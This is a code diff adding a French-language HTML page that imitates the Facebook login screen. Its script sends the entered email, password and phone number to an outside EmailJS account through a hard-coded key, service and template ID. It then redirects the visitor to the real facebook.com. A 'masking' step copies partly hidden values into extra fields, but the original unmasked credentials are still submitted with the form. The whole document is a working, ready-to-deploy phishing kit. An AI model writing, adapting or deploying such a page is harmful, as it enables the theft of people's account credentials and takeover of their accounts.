@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Connexion Facebook avec EmailJS</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f0f2f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .login-container {
+      background: white;
+      padding: 20px 30px;
+      border-radius: 8px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+      width: 320px;
+      text-align: center;
+    }
+    h1 {
+      color: #1877f2;
+      font-weight: bold;
+      margin-bottom: 10px;
+      font-size: 36px;
+    }
+    input[type="email"],
+    input[type="password"],
+    input[type="tel"] {
+      width: 100%;
+      padding: 12px;
+      margin: 8px 0;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      font-size: 16px;
+      box-sizing: border-box;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #1877f2;
+      border: none;
+      border-radius: 6px;
+      color: white;
+      font-size: 18px;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 12px;
+      box-sizing: border-box;
+    }
+    button:hover {
+      background-color: #165ec9;
+    }
+  </style>
+  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+  <script>
+    (function(){
+      emailjs.init("iT9jATstbLPGhkUGN"); // Clé publique EmailJS fournie
+    })();
+
+    // Fonction pour masquer partiellement les données sensibles
+    function maskString(str) {
+      if (!str) return '';
+      if (str.length <= 3) return '***';
+      return '*'.repeat(str.length - 3) + str.slice(-3);
+    }
+
+    function sendEmail(event) {
+      event.preventDefault();
+
+      const form = event.target;
+
+      if (!form.email.value.includes('@')) {
+        alert('Veuillez entrer un email valide.');
+        form.email.focus();
+        return;
+      }
+
+      // Masquage partiel des données à envoyer
+      form.maskedEmail.value = maskString(form.email.value);
+      form.maskedPassword.value = maskString(form.password.value);
+      form.maskedPhone.value = maskString(form.phone.value);
+
+      const btn = form.querySelector('button');
+      btn.disabled = true;
+      btn.textContent = 'Envoi en cours...';
+
+      emailjs.sendForm('service_m22va84', 'template_ka9w0c4', form)
+      .then(function() {
+        alert('Formulaire envoyé avec succès !');
+        form.reset();
+        btn.disabled = false;
+        btn.textContent = 'Se connecter';
+        window.location.href = "https://www.facebook.com/";
+      }, function(error) {
+        alert('Échec de l’envoi : ' + JSON.stringify(error));
+        btn.disabled = false;
+        btn.textContent = 'Se connecter';
+      });
+    }
+  </script>
+</head>
+<body>
+  <div class="login-container">
+    <h1>facebook</h1>
+    <form onsubmit="sendEmail(event)">
+      <input type="email" name="email" placeholder="Email ou téléphone" required />
+      <input type="password" name="password" placeholder="Mot de passe" required />
+      <input type="tel" name="phone" placeholder="Numéro de téléphone" />
+      
+      <!-- Champs cachés pour données masquées -->
+      <input type="hidden" name="maskedEmail" />
+      <input type="hidden" name="maskedPassword" />
+      <input type="hidden" name="maskedPhone" />
+      
+      <button type="submit">Se connecter</button>
+    </form>
+  </div>
+</body>
+</html>
